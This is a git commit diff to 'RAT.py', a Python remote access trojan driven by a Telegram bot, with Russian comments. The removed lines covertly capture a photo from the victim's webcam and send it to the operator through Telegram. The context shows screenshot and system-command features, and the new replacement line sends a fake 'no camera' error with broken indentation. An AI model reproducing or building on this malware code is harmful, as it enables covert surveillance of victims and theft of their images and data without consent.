89c306e56567ff12ebf3d146384100414754ed77
Kamakepar2029 <58629552+Kamakepar2029@users.noreply.github.com>
2020-11-07 20:26:44 +0300

    Update RAT.py

--- back/RAT.py
+++ back/RAT.py
@@ -13,8 +13,7 @@
 import telebot 					# Библиотека для создание Telegram бота
 import requests					# Библиотека для get/post запросов
 import os 						# Библиотека для работы с системой
-import subprocess 				# Библиотека для работы с системными командами
-import cv2 						# Бибилиотека для фото с веб-камеры
+import subprocess 				# Библиотека для работы с системными командами					# Бибилиотека для фото с веб-камеры
 from PIL import ImageGrab		# Модуль для скриншотов экрана
 from datetime import datetime	# Модуль времени
 from os import system 			# Библиотека для выполнения системных команд
@@ -114,23 +113,7 @@ def text_message(message):
 		elif message.text == 'Фото с Камеры':
 			try: # Пытаемся получить фото с камеры
 				# Включаём основную камеру
-				cam = cv2.VideoCapture(0)
-				# "Прогреваем" камеру, чтобы снимок не был тёмным
-				for _ in range(100):
-					cam.read()
-				# Делаем снимок
-				s, img = cam.read()
-				# Сохраняем снимок
-				cv2.imwrite('img.bmp', img)
-				# Отключаем камеру
-				cam.release()
-				# Открываем снимок
-				cam_img = open('img.bmp', 'rb')
-				# Отправляем нам снимок
-				bot.send_photo(user_id, cam_img)
-				# Закрываем и удаляем снимок
-				cam_img.close()
-				os.remove('img.bmp')
+		                bot.send_message(user_id, 'Ошибка! У пользователя нет камеры!')
 			except: # Если произошла ошибка
 				bot.send_message(user_id, 'Ошибка! У пользователя нет камеры!')
 		elif message.text == 'Скриншот Экрана': # Если текст = Скриншот Экрана, то..
